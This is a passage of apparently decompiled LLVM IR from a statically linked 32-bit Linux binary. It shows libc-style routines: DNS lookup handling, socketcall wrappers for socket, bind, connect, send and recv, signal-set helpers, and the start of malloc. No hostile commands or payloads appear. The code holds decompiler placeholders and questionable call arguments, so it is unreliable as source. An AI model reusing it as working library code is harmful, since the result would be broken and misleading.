  store i32 ptrtoint (i32* @global_var_8062a48.233 to i32), i32* @ecx, align 4
  store i32 134540701, i32* %eax.global-to-local, align 4
  store i32 %v2_8052080, i32* %stack_var_-108, align 4
  %v3_80520a1 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-36, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_80520bc = ptrtoint i32* %stack_var_-76 to i32
  %v2_80520c1 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80520c1, i32* %eax.global-to-local, align 4
  store i32 %v2_80520c1, i32* %stack_var_-108, align 4
  %v0_80520cb = load i32, i32* @esi, align 4
  %v7_80520d2 = call i32 @__dns_lookup(i8* %v2_805202c, i32 1, i32 %v0_80520cb, i32 ptrtoint (i32* @global_var_8067ab4.235 to i32), i32 %v2_80520c1, i32 %v2_80520bc)
  store i32 %v7_80520d2, i32* %eax.global-to-local, align 4
  %v2_80520da = icmp slt i32 %v7_80520d2, 0
  %v1_80520dc = icmp eq i1 %v2_80520da, false
  br i1 %v1_80520dc, label %dec_label_pc_80520f2, label %dec_label_pc_80520de

dec_label_pc_80520de:                             ; preds = %dec_label_pc_8052070
  store i32 %arg6, i32* @ecx, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_8051f7d, align 4
  br label %dec_label_pc_8052246

dec_label_pc_80520f2:                             ; preds = %dec_label_pc_8052070
  %v4_80520f2 = trunc i64 %tmp11 to i32
  store i32 %v4_80520f2, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_8052105 = icmp ugt i32 %v1_8051feb, 256
  %v15_8052105 = icmp eq i32 %v0_8051feb, 300
  %v2_8052109 = or i1 %v10_8052105, %v15_8052105
  br i1 %v2_8052109, label %dec_label_pc_80521a4, label %dec_label_pc_805210b

dec_label_pc_805210b:                             ; preds = %dec_label_pc_80520f2
  %v3_805210e = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805210e, i32* %stack_var_-108, align 4
  %v1_8052112 = call i32 @free(i32 %v3_805210e)
  store i32 %v1_8052112, i32* %eax.global-to-local, align 4
  store i32 %v3_805210e, i32* @edi, align 4
  %v3_8052118 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052118, i32* %stack_var_-108, align 4
  %v1_805211c = call i32 @free(i32 %v3_8052118)
  store i32 -1, i32* %v1_8051f7d, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805221c

dec_label_pc_80521a4:                             ; preds = %dec_label_pc_80520f2
  %v3_80521a9.pre = load i32, i32* %stack_var_-76, align 4
  %v0_80521ad.pre = load i32, i32* @edi, align 4
  store i32 %v0_80521ad.pre, i32* %stack_var_-108, align 4
  %v3_80521ae = inttoptr i32 %v0_80521ad.pre to i8*
  %v4_80521ae = call i32 @strncpy(i8* %v3_80521ae, i32 %v3_80521a9.pre, i32 %v1_8051feb)
  store i32 %v4_80521ae, i32* %eax.global-to-local, align 4
  store i32 %v0_80521ad.pre, i32* @ecx, align 4
  %v3_80521b4 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_80521b4, i32* %stack_var_-108, align 4
  %v1_80521b8 = call i32 @free(i32 %v3_80521b4)
  store i32 %v1_80521b8, i32* %eax.global-to-local, align 4
  %v12_80521c0 = icmp eq i32 %tmp10, 1
  %v1_80521c5 = icmp eq i1 %v12_80521c0, false
  br i1 %v1_80521c5, label %dec_label_pc_8052221, label %dec_label_pc_80521c7

dec_label_pc_80521c7:                             ; preds = %dec_label_pc_80521a4
  %v0_80521c7 = load i32, i32* @edx, align 4
  %v0_80521ce = load i32, i32* @ebp, align 4
  store i32 %v0_80521ce, i32* %stack_var_-108, align 4
  %v3_80521cf = inttoptr i32 %tmp to i16*
  %v4_80521cf = call i32 @memcpy(i16* %v3_80521cf, i32 4, i32 %v0_80521c7)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_80521d8 = load i32, i32* @edi, align 4
  store i32 %v0_80521d8, i32* %arg2, align 4
  %v1_80521da = add i32 %tmp18, 8
  %v2_80521da = inttoptr i32 %v1_80521da to i32*
  store i32 2, i32* %v2_80521da, align 4
  %v0_80521e1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80521e1 = add i32 %v0_80521e1, 12
  %v2_80521e1 = inttoptr i32 %v1_80521e1 to i32*
  store i32 4, i32* %v2_80521e1, align 4
  %v3_80521e8 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_80521e8, i32* %edx.global-to-local, align 4
  %v1_80521ec = load i32, i32* %eax.global-to-local, align 4
  %v2_80521ec = add i32 %v1_80521ec, 16
  %v3_80521ec = inttoptr i32 %v2_80521ec to i32*
  store i32 %v3_80521e8, i32* %v3_80521ec, align 4
  store i32 %v1_8051ffe, i32* @ecx, align 4
  %v1_80521f3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80521f3 = add i32 %v1_80521f3, 4
  %v3_80521f3 = inttoptr i32 %v2_80521f3 to i32*
  store i32 %v1_8051ffe, i32* %v3_80521f3, align 4
  %v2_80521f6 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_80521f6, i32* %eax.global-to-local, align 4
  %v3_80521f7 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_80521f7, i32* %stack_var_-108, align 4
  %v1_80521fb = call i32 @free(i32 %v3_80521f7)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_8051f2f, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* @ecx, align 4
  store i32 0, i32* %v1_8051f7d, align 4
  br label %dec_label_pc_805221c

dec_label_pc_805221c:                             ; preds = %dec_label_pc_8052221, %dec_label_pc_805210b, %dec_label_pc_80521c7
  br label %dec_label_pc_8052246

dec_label_pc_8052221:                             ; preds = %dec_label_pc_80521a4
  %v3_8052224 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8052224, i32* %stack_var_-108, align 4
  %v1_8052228 = call i32 @free(i32 %v3_8052224)
  store i32 1, i32* %v1_8051f7d, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805221c

dec_label_pc_8052241:                             ; preds = %dec_label_pc_8051feb, %dec_label_pc_8051fcf, %dec_label_pc_8051fc3, %dec_label_pc_8051fb0, %dec_label_pc_8051fa4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052246

dec_label_pc_8052246:                             ; preds = %dec_label_pc_8051f90, %dec_label_pc_8051f89, %dec_label_pc_8051f45, %entry, %dec_label_pc_805221c, %dec_label_pc_80520de, %dec_label_pc_8052038, %dec_label_pc_8052241
  store i32 %v0_8051f1f, i32* @ebx, align 4
  store i32 %v0_8051f1e, i32* @esi, align 4
  store i32 %v0_8051f1d, i32* @edi, align 4
  store i32 %v0_8051f1c, i32* @ebp, align 4
  %v0_805224d = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805224d

; uselistorder directives
  uselistorder i32 %v1_8052001, { 1, 0, 2 }
  uselistorder i32 %v1_8051ffe, { 2, 1, 0 }
  uselistorder i32 %v1_8051feb, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8051fb4.pre, { 0, 2, 1 }
  uselistorder i32 %v1_8051f9f, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_8051f7d, { 2, 0, 1, 3 }
  uselistorder i32* %v1_8051f7d, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_8051f2f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 30, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31 }
  uselistorder i32 %arg6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 2, 0, 1 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8052246, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805221c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051fb0, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805226b = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052272 = call i32 @__socketcall(i32 5, i32 %v2_805226b)
  ret i32 %v2_8052272

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052297 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805229e = call i32 @__socketcall(i32 2, i32 %v2_8052297)
  ret i32 %v2_805229e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80522c3 = ptrtoint i32* %stack_var_-12 to i32
  %v2_80522ca = call i32 @__socketcall(i32 3, i32 %v2_80522c3)
  ret i32 %v2_80522ca

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_80522e7 = ptrtoint i32* %stack_var_-8 to i32
  %v2_80522ee = call i32 @__socketcall(i32 4, i32 %v2_80522e7)
  ret i32 %v2_80522ee

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_805231b = ptrtoint i32* %stack_var_-16 to i32
  %v2_8052322 = call i32 @__socketcall(i32 10, i32 %v2_805231b)
  ret i32 %v2_8052322

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_recvfrom(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_805235f = ptrtoint i32* %stack_var_-24 to i32
  %v2_8052366 = call i32 @__socketcall(i32 12, i32 %v2_805235f)
  ret i32 %v2_8052366

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_recvmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_805238b = ptrtoint i32* %stack_var_-12 to i32
  %v2_8052392 = call i32 @__socketcall(i32 17, i32 %v2_805238b)
  ret i32 %v2_8052392

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_80523bf = ptrtoint i32* %stack_var_-16 to i32
  %v2_80523c6 = call i32 @__socketcall(i32 9, i32 %v2_80523bf)
  ret i32 %v2_80523c6

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendmsg(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_80523eb = ptrtoint i32* %stack_var_-12 to i32
  %v2_80523f2 = call i32 @__socketcall(i32 16, i32 %v2_80523eb)
  ret i32 %v2_80523f2

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_805242f = ptrtoint i32* %stack_var_-24 to i32
  %v2_8052436 = call i32 @__socketcall(i32 11, i32 %v2_805242f)
  ret i32 %v2_8052436

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_805246b = ptrtoint i32* %stack_var_-20 to i32
  %v2_8052472 = call i32 @__socketcall(i32 14, i32 %v2_805246b)
  ret i32 %v2_8052472

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8052497 = ptrtoint i32* %stack_var_-12 to i32
  %v2_805249e = call i32 @__socketcall(i32 1, i32 %v2_8052497)
  ret i32 %v2_805249e

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 1, 0, 8, 11, 7, 10, 9, 5, 4, 6, 2, 3 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_80524c0, label %dec_label_pc_80524b3

dec_label_pc_80524b3:                             ; preds = %entry
  %v1_80524b3 = add i32 %arg1, -64
  %v3_80524b3 = sub i32 63, %arg1
  %v4_80524b3 = and i32 %v3_80524b3, %arg1
  %v5_80524b3 = icmp slt i32 %v4_80524b3, 0
  %v6_80524b3 = icmp eq i32 %v1_80524b3, 0
  %v7_80524b3 = icmp slt i32 %v1_80524b3, 0
  %v3_80524b6 = icmp eq i1 %v7_80524b3, %v5_80524b3
  %v4_80524b6 = icmp eq i1 %v6_80524b3, false
  %v5_80524b6 = and i1 %v4_80524b6, %v3_80524b6
  br i1 %v5_80524b6, label %dec_label_pc_80524c0, label %dec_label_pc_80524b8

dec_label_pc_80524b8:                             ; preds = %dec_label_pc_80524b3
  %v4_80524bb = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_80524c0

dec_label_pc_80524c0:                             ; preds = %dec_label_pc_80524b3, %entry, %dec_label_pc_80524b8
  %v1_80524c0 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_80524c5 = inttoptr i32 %v1_80524c0 to i32*
  store i32 22, i32* %v1_80524c5, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_80524b3, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80524c0, { 2, 0, 1 }
}

define i32 @__GI_sigdelset(i32 %arg1) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_80524ec, label %dec_label_pc_80524df

dec_label_pc_80524df:                             ; preds = %entry
  %v1_80524df = add i32 %arg1, -64
  %v3_80524df = sub i32 63, %arg1
  %v4_80524df = and i32 %v3_80524df, %arg1
  %v5_80524df = icmp slt i32 %v4_80524df, 0
  %v6_80524df = icmp eq i32 %v1_80524df, 0
  %v7_80524df = icmp slt i32 %v1_80524df, 0
  %v3_80524e2 = icmp eq i1 %v7_80524df, %v5_80524df
  %v4_80524e2 = icmp eq i1 %v6_80524df, false
  %v5_80524e2 = and i1 %v4_80524e2, %v3_80524e2
  br i1 %v5_80524e2, label %dec_label_pc_80524ec, label %dec_label_pc_80524e4

dec_label_pc_80524e4:                             ; preds = %dec_label_pc_80524df
  %v0_80524e7 = call i32 @__sigdelset()
  br label %dec_label_pc_80524ec

dec_label_pc_80524ec:                             ; preds = %dec_label_pc_80524df, %entry, %dec_label_pc_80524e4
  %v1_80524ec = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_80524f1 = inttoptr i32 %v1_80524ec to i32*
  store i32 22, i32* %v1_80524f1, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_80524df, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_80524ec, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805250e = inttoptr i32 %arg1 to i8*
  %v4_805250e = call i32 @__GI_memset(i8* %v3_805250e, i32 0, i32 128)
  ret i32 0
}

define i32 @sigfillset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805252d = inttoptr i32 %arg1 to i8*
  %v4_805252d = call i32 @__GI_memset(i8* %v3_805252d, i32 255, i32 128)
  ret i32 0
}

define i32 @sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8052550, label %dec_label_pc_8052543

dec_label_pc_8052543:                             ; preds = %entry
  %v1_8052543 = add i32 %arg1, -64
  %v3_8052543 = sub i32 63, %arg1
  %v4_8052543 = and i32 %v3_8052543, %arg1
  %v5_8052543 = icmp slt i32 %v4_8052543, 0
  %v6_8052543 = icmp eq i32 %v1_8052543, 0
  %v7_8052543 = icmp slt i32 %v1_8052543, 0
  %v3_8052546 = icmp eq i1 %v7_8052543, %v5_8052543
  %v4_8052546 = icmp eq i1 %v6_8052543, false
  %v5_8052546 = and i1 %v4_8052546, %v3_8052546
  br i1 %v5_8052546, label %dec_label_pc_8052550, label %dec_label_pc_8052548

dec_label_pc_8052548:                             ; preds = %dec_label_pc_8052543
  %v4_805254b = call i32 @__sigismember(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8052550

dec_label_pc_8052550:                             ; preds = %dec_label_pc_8052543, %entry, %dec_label_pc_8052548
  %v1_8052550 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8052555 = inttoptr i32 %v1_8052550 to i32*
  store i32 22, i32* %v1_8052555, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_8052543, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8052550, { 2, 0, 1 }
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v0_8052564 = load i32, i32* @ebx, align 4
  store i32 %tmp2, i32* @ebx, align 4
  %v4_805256c = icmp eq i32 %tmp, 0
  br i1 %v4_805256c, label %dec_label_pc_805258d, label %dec_label_pc_8052573

dec_label_pc_8052573:                             ; preds = %entry
  %v1_8052574 = add i32 %tmp2, 28
  %v4_805257c = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* null, i32 %v1_8052574)
  %v1_8052589 = icmp eq i32 %v4_805257c, 0
  br i1 %v1_8052589, label %dec_label_pc_805258f, label %dec_label_pc_805258d

dec_label_pc_805258d:                             ; preds = %dec_label_pc_8052573, %entry
  br label %dec_label_pc_805258f

dec_label_pc_805258f:                             ; preds = %dec_label_pc_8052573, %dec_label_pc_805258d
  %v0_805258f = phi i32 [ 1, %dec_label_pc_8052573 ], [ 0, %dec_label_pc_805258d ]
  %v1_805258f = load i32, i32* @ebx, align 4
  %v2_805258f = add i32 %v1_805258f, 24
  %v3_805258f = inttoptr i32 %v2_805258f to i32*
  store i32 %v0_805258f, i32* %v3_805258f, align 4
  store i32 %v0_8052564, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_805258f, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_80525a6 = add i32 %arg2, -1
  %v1_80525a9 = urem i32 %v1_80525a6, 32
  %v2_80525a9 = icmp eq i32 %v1_80525a9, 0
  store i32 %v1_80525a9, i32* @ecx, align 4
  %v2_80525ac = udiv i32 %v1_80525a6, 32
  br i1 %v2_80525a9, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_80525af = shl i32 1, %v1_80525a9
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_80525b1 = phi i32 [ 1, %entry ], [ %v5_80525af, %bb ]
  %v2_80525b1 = mul nuw nsw i32 %v2_80525ac, 4
  %v3_80525b1 = add i32 %v2_80525b1, %arg1
  %v4_80525b1 = inttoptr i32 %v3_80525b1 to i32*
  %v5_80525b1 = load i32, i32* %v4_80525b1, align 4
  %v7_80525b1 = and i32 %v5_80525b1, %v6_80525b1
  %v8_80525b1 = icmp eq i32 %v7_80525b1, 0
  %v1_80525b5 = icmp eq i1 %v8_80525b1, false
  %v2_80525b5 = zext i1 %v1_80525b5 to i32
  ret i32 %v2_80525b5

; uselistorder directives
  uselistorder i32 %v1_80525a9, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80525bc = load i32, i32* @ebx, align 4
  store i32 %v0_80525bc, i32* %stack_var_-4, align 4
  %v1_80525ca = add i32 %arg2, -1
  %v1_80525cd = urem i32 %v1_80525ca, 32
  %v2_80525cd = icmp eq i32 %v1_80525cd, 0
  store i32 %v1_80525cd, i32* @ecx, align 4
  %v2_80525d0 = udiv i32 %v1_80525ca, 32
  store i32 %v2_80525d0, i32* @edx, align 4
  br i1 %v2_80525cd, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_80525d3 = shl i32 1, %v1_80525cd
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_80525d5 = phi i32 [ 1, %entry ], [ %v5_80525d3, %bb ]
  %v2_80525d5 = mul nuw nsw i32 %v2_80525d0, 4
  %v3_80525d5 = add i32 %v2_80525d5, %arg1
  %v4_80525d5 = inttoptr i32 %v3_80525d5 to i32*
  %v5_80525d5 = load i32, i32* %v4_80525d5, align 4
  %v7_80525d5 = or i32 %v5_80525d5, %v6_80525d5
  store i32 %v7_80525d5, i32* %v4_80525d5, align 4
  %v2_80525da = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80525da, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_80525d0, { 1, 0 }
  uselistorder i32 %v1_80525cd, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigdelset() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_80525dc = load i32, i32* @ebx, align 4
  store i32 %v0_80525dc, i32* %stack_var_-4, align 4
  %v1_80525ea = add i32 %tmp2, -1
  %v1_80525ed = urem i32 %v1_80525ea, 32
  %v2_80525ed = icmp eq i32 %v1_80525ed, 0
  %v2_80525f0 = udiv i32 %v1_80525ea, 32
  br i1 %v2_80525ed, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v4_80525f3 = shl i32 -2, %v1_80525ed
  %v5_80525f3 = sub nsw i32 32, %v1_80525ed
  %v6_80525f3 = lshr i32 -2, %v5_80525f3
  %v7_80525f3 = or i32 %v6_80525f3, %v4_80525f3
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_80525f5 = phi i32 [ -2, %entry ], [ %v7_80525f3, %bb ]
  %v2_80525f5 = mul nuw nsw i32 %v2_80525f0, 4
  %v3_80525f5 = add i32 %v2_80525f5, %tmp
  %v4_80525f5 = inttoptr i32 %v3_80525f5 to i32*
  %v5_80525f5 = load i32, i32* %v4_80525f5, align 4
  %v7_80525f5 = and i32 %v5_80525f5, %v6_80525f5
  store i32 %v7_80525f5, i32* %v4_80525f5, align 4
  %v2_80525fa = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80525fa, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_80525ed, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_80525fc = load i32, i32* @eax, align 4
  %v6_805260f = icmp ugt i32 %v0_80525fc, 16777215
  br i1 %v6_805260f, label %dec_label_pc_8052620, label %dec_label_pc_8052611

dec_label_pc_8052611:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_80525fc, 256
  %v2_80525ff = udiv i32 %v0_80525fc, 256
  %v2_8052611 = call i32 @llvm.ctlz.i32(i32 %v2_80525ff, i1 true)
  %v3_8052611 = xor i32 %v2_8052611, 31
  %v5_8052611 = select i1 %tmp, i32 95, i32 %v3_8052611
  %v1_8052614 = add nuw nsw i32 %v5_8052611, 6
  store i32 %v1_8052614, i32* @ecx, align 4
  %v2_8052617 = urem i32 %v1_8052614, 32
  %v4_8052617 = icmp eq i32 %v2_8052617, 0
  br i1 %v4_8052617, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_8052611
  %v5_8052617 = lshr i32 %v0_80525fc, %v2_8052617
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_8052611, %bb
  %v0_8052619 = phi i32 [ %v0_80525fc, %dec_label_pc_8052611 ], [ %v5_8052617, %bb ]
  %v1_8052619 = urem i32 %v0_8052619, 4
  %v2_805261c = mul nuw nsw i32 %v5_8052611, 4
  %v3_805261c = or i32 %v1_8052619, 32
  %v4_805261c = add nuw nsw i32 %v3_805261c, %v2_805261c
  br label %dec_label_pc_8052620

dec_label_pc_8052620:                             ; preds = %entry, %bb4
  %v0_8052621 = phi i32 [ 95, %entry ], [ %v4_805261c, %bb4 ]
  ret i32 %v0_8052621

; uselistorder directives
  uselistorder i32 %v2_8052617, { 1, 0 }
  uselistorder i32 %v0_80525fc, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_8052620, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8052622 = load i32, i32* @ebp, align 4
  %v0_8052623 = load i32, i32* @edi, align 4
  %v0_8052624 = load i32, i32* @esi, align 4
  %v0_8052625 = load i32, i32* @ebx, align 4
  store i32 %v0_8052625, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8052637 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052637, i32* %eax.global-to-local, align 4
  store i32 %v2_8052637, i32* %stack_var_-92, align 4
  %v4_805263c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134540701, i32 ptrtoint (i32* @global_var_8062910.167 to i32))
  store i32 %v4_805263c, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8062910.167 to i32), i32* %stack_var_-92, align 4
  %v1_8052648 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062910.167 to i32))
  store i32 %v1_8052648, i32* %eax.global-to-local, align 4
  %v0_8052650 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_8052650, -32
  br i1 %tmp, label %dec_label_pc_8052667, label %dec_label_pc_8052655

dec_label_pc_8052655:                             ; preds = %entry
  %v0_8052655 = load i32, i32* %stack_var_-92, align 4
  %v1_8052655 = call i32 @__errno_location(i32 %v0_8052655)
  store i32 %v1_8052655, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805265c = inttoptr i32 %v1_8052655 to i32*
  store i32 12, i32* %v1_805265c, align 4
  br label %dec_label_pc_8052d8c

dec_label_pc_8052667:                             ; preds = %entry
  %v1_8052667 = add i32 %v0_8052650, 11
  %tmp127 = icmp ult i32 %v1_8052667, 16
  br i1 %tmp127, label %dec_label_pc_805267e, label %dec_label_pc_8052677

dec_label_pc_8052677:                             ; preds = %dec_label_pc_8052667
  %v1_8052677 = and i32 %v1_8052667, -8
  br label %dec_label_pc_805267e

dec_label_pc_805267e:                             ; preds = %dec_label_pc_8052667, %dec_label_pc_8052677
  %storemerge131 = phi i32 [ %v1_8052677, %dec_label_pc_8052677 ], [ %v1_8052667, %dec_label_pc_8052667 ]
  %v1_8052a16 = phi i32 [ %v1_8052677, %dec_label_pc_8052677 ], [ 16, %dec_label_pc_8052667 ]
  store i32 %storemerge131, i32* %eax.global-to-local, align 4
  %v0_805267e = load i8, i8* @global_var_8067680.236, align 1
  %v1_805267e = sext i8 %v0_805267e to i32
  store i32 %v1_805267e, i32* @ebx, align 4
